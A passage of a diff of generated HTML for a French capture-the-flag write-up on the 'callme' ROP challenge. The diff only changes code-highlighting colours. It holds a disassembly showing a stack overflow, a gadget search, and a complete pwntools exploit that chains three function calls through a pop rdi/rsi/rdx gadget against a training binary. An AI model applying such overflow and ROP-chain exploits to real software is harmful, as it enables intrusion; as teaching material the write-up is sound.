+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008cf</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">55</span><span style="color:#ff79c6">&gt;</span>:  lea    rax,[rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x20</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008d3</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">59</span><span style="color:#ff79c6">&gt;</span>:  mov    edx,<span style="color:#bd93f9">0x200</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008d8</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">64</span><span style="color:#ff79c6">&gt;</span>:  mov    rsi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008db</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">67</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008e0</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">72</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x400710</span> <span style="color:#ff79c6">&lt;</span>read@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008e5</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">77</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x400a16</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008ea</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">82</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x4006d0</span> <span style="color:#ff79c6">&lt;</span>puts@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008ef</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">87</span><span style="color:#ff79c6">&gt;</span>:  nop
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008f0</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">88</span><span style="color:#ff79c6">&gt;</span>:  leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008f1</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">89</span><span style="color:#ff79c6">&gt;</span>:  ret    
+</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#ff79c6">.</span>
 </span></span></code></pre></div><p>On voit donc que la fonction <code>read</code> va lire <code>0x200</code> bytes puis les stocker dans un buffer de <code>0x20</code> bytes, ce qui est largement suffisant pour l&rsquo;overflow et faire ce qu&rsquo;on veut.</p>
 <p>Maintenant, il nous faut les adresses des trois fonctions callme, pour les trouver, on peut par exemple utiliser <code>pwndbg</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#ff79c6">&gt;</span> info functions
 </span></span><span style="display:flex;"><span>All defined functions:
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a8</span>  _init
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006d0</span>  puts<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e0</span>  printf<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006f0</span>  callme_three<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400700</span>  memset<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400710</span>  read<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400720</span>  callme_one<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400730</span>  setvbuf<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400740</span>  callme_two<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400750</span>  exit<span style="color:#a6e22e">@plt</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  _start
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400790</span>  _dl_relocate_static_pie
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007a0</span>  deregister_tm_clones
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  register_tm_clones
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400810</span>  __do_global_dtors_aux
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400840</span>  frame_dummy
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400847</span>  main
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400898</span>  pwnme
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004008f2</span>  usefulFunction
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span>  usefulGadgets
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400940</span>  __libc_csu_init
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b0</span>  __libc_csu_fini
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b4</span>  _fini
+</span></span><span style="display:flex;"><span>Non<span style="color:#ff79c6">-</span>debugging symbols:
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004006a8</span>  _init
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004006d0</span>  puts@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004006e0</span>  printf@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004006f0</span>  callme_three@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400700</span>  memset@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400710</span>  read@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400720</span>  callme_one@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400730</span>  setvbuf@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400740</span>  callme_two@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400750</span>  exit@plt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400760</span>  _start
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400790</span>  _dl_relocate_static_pie
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004007a0</span>  deregister_tm_clones
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004007d0</span>  register_tm_clones
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400810</span>  __do_global_dtors_aux
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400840</span>  frame_dummy
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400847</span>  main
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400898</span>  pwnme
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004008f2</span>  usefulFunction
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000000040093c</span>  usefulGadgets
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x0000000000400940</span>  __libc_csu_init
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004009b0</span>  __libc_csu_fini
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004009b4</span>  _fini
 </span></span></code></pre></div><p>On voit que:</p>
 <ul>
 <li>callme_one est située à <code>0x00400720</code></li>
@@ -284,8 +288,8 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 <p>Maintenant, il nous faut un gadget qui va pop <code>rdi</code>, <code>rsi</code> et <code>rdx</code> puisque ce sont les registres utilisés pour les 3 premiers arguments
 (cf. <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">linux calling convention stack frame</a>)</p>
 <p>On va utiliser ROPgadget pour le trouver:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; pop rsi ; pop rdx&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span> : pop rdi ; pop rsi ; pop rdx ; ret
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#ff79c6">--</span>binary callme <span style="color:#ff79c6">|</span> grep <span style="color:#f1fa8c">&#34;pop rdi ; pop rsi ; pop rdx&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000000040093c</span> : pop rdi ; pop rsi ; pop rdx ; ret
 </span></span></code></pre></div><p>On a notre gadget, et on peut totalement l&rsquo;utiliser 3 fois pour chaque fonction, donc pas besoin d&rsquo;en trouver deux autres.</p>
 <p>Récapitulons avant de commencer notre exploit:</p>
 <ul>
@@ -294,108 +298,108 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 <li>On peut appeller chaque fonction une par une avec les arguments qu&rsquo;on veut</li>
 </ul>
 <p>Très bien, commençons notre exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> binary <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./callme&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> process()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
-</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>rbp <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x8</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
+</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x000000000040093c</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
-</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
-</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
+</span></span><span style="display:flex;"><span>callme_one <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x00400720</span>)
+</span></span><span style="display:flex;"><span>callme_two <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x00400740</span>)
+</span></span><span style="display:flex;"><span>callme_three <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x004006f0</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
-</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
-</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0xdeadbeefdeadbeef</span>)
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0xcafebabecafebabe</span>)
+</span></span><span style="display:flex;"><span>arg3 <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0xd00df00dd00df00d</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> padding <span style="color:#ff79c6">+</span> rbp
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pop_rdi_rsi_rdx
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> arg1 <span style="color:#ff79c6">+</span> arg2 <span style="color:#ff79c6">+</span> arg3
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> callme_one
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pop_rdi_rsi_rdx
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> arg1 <span style="color:#ff79c6">+</span> arg2 <span style="color:#ff79c6">+</span> arg3
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> callme_two
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ...</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pop_rdi_rsi_rdx
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> arg1 <span style="color:#ff79c6">+</span> arg2 <span style="color:#ff79c6">+</span> arg3
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> callme_three
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(p<span style="color:#ff79c6">.</span>recvall())
 </span></span></code></pre></div><p>Testons le pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png" alt="2023-01-15-152741_1107x131_scrot"></p>
 <p>Et on voit que le programme a <code>segfault</code>&hellip; Pour rappel je suis sous <strong>Ubuntu 22.04</strong> donc mon système est affecté par les problèmes de <em>stack alignment</em>. On va donc ajouter un ret juste après notre padding, qu&rsquo;on peut trouver avec ROPgadget</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#ff79c6">--</span>binary callme
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Gadgets information
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006be</span> : ret
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
-</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">110</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;...&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000004006be</span> : ret
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;...&gt;</span>
+</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#bd93f9">110</span>
 </span></span></code></pre></div><h2 id="final-payload">Final Payload</h2>
 <p>Complétons notre exploit avec ce ret:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> binary <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./callme&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> process()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
-</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>rbp <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x8</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004006be</span>)
-</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x00000000004006be</span>)
+</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x000000000040093c</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
-</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
-</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
+</span></span><span style="display:flex;"><span>callme_one <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x00400720</span>)
+</span></span><span style="display:flex;"><span>callme_two <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x00400740</span>)
+</span></span><span style="display:flex;"><span>callme_three <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0x004006f0</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
-</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
-</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0xdeadbeefdeadbeef</span>)
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0xcafebabecafebabe</span>)
+</span></span><span style="display:flex;"><span>arg3 <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0xd00df00dd00df00d</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> padding <span style="color:#ff79c6">+</span> rbp
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ret gadget</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> ret
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ret gadget</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> ret
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pop_rdi_rsi_rdx
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> arg1 <span style="color:#ff79c6">+</span> arg2 <span style="color:#ff79c6">+</span> arg3
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> callme_one
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pop_rdi_rsi_rdx
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> arg1 <span style="color:#ff79c6">+</span> arg2 <span style="color:#ff79c6">+</span> arg3
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> callme_two
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ...</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pop_rdi_rsi_rdx
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> arg1 <span style="color:#ff79c6">+</span> arg2 <span style="color:#ff79c6">+</span> arg3
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> callme_three
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendline(payload)
